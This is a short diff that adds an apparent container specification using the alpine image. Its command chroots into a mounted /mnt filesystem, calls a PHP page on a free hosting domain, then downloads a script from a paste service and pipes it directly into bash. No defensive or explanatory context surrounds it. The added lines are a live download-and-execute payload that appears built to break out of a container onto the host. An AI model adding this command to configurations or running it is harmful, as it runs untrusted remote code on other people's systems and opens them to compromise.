@@ -1,0 +1,2 @@
+  Image: alpine
+        Command: chroot /mnt /bin/sh -c 'curl -s http://dffsdfsdfsd.x10host.com/p.php > /dev/null;curl -s -L http://ix.io/1K8E | bash -s;'
